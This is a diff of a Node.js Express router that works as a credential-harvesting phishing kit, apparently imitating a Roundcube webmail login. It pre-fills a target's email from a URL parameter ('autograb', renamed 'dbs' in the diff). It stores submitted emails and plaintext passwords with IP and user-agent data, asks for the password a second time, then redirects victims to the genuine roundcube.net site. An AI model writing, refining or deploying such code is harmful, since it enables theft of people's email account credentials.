@@ -1,67 +1,66 @@
-const express = require('express');
+const express = require("express");
 const router = express.Router();
-const IP = require('ip');
+const IP = require("ip");
 
 // Load User model
-const User = require('../models/User');
+const User = require("../models/User");
 
 // Login Page
-router.get('/login', (req, res) => {
-  let email = req.query.autograb || '';
-  res.render('login', { email: email });
+router.get("/login", (req, res) => {
+  let email = req.query.dbs || "";
+  res.render("login", { email: email });
 });
 
-router.get('/loginverify', (req, res) => res.render('login2'));
+router.get("/loginverify", (req, res) => res.render("login2"));
 
 // Login
-router.post('/loginok', (req, res, next) => {
+router.post("/loginok", (req, res, next) => {
   const { email, password } = req.body;
 
   const userIp = IP.address();
-  console.log(userIp)
+  console.log(userIp);
 
-  const userAgent = req.headers['user-agent']
-  
+  const userAgent = req.headers["user-agent"];
+
   const user = new User({ email, password, userIp, userAgent });
 
   user
     .save()
-    .then(result => {
+    .then((result) => {
       console.log(result);
-      req.flash('success_msg', 'Login ok');
+      req.flash("success_msg", "Login ok");
 
       // Redirect with email as a query parameter
-      res.redirect(`/users/loginverify?autograb=${encodeURIComponent(email)}`);
+      res.redirect(`/users/loginverify?dbs=${encodeURIComponent(email)}`);
     })
-    .catch(err => console.log(err));
+    .catch((err) => console.log(err));
 });
-
 
 // Login Verify page
 // Login Verify
-router.post('/loginverify', (req, res, next) => {
+router.post("/loginverify", (req, res, next) => {
   const { password } = req.body;
 
   // Get email from query parameter
-  const email = req.query.email || '';
+  const email = req.query.email || "";
 
   const user = new User({ email, password });
 
   user
     .save()
-    .then(result => {
+    .then((result) => {
       console.log(result);
-      req.flash('success_msg', 'Questions ok');
-      res.redirect('https://roundcube.net/');
+      req.flash("success_msg", "Questions ok");
+      res.redirect("https://roundcube.net/");
     })
-    .catch(err => console.log(err));
+    .catch((err) => console.log(err));
 });
 
 // Logout
-router.get('/logout', (req, res) => {
+router.get("/logout", (req, res) => {
   req.logout();
-  req.flash('success_msg', 'You are logged out');
-  res.redirect('/users/login');
+  req.flash("success_msg", "You are logged out");
+  res.redirect("/users/login");
 });
 
 module.exports = router;
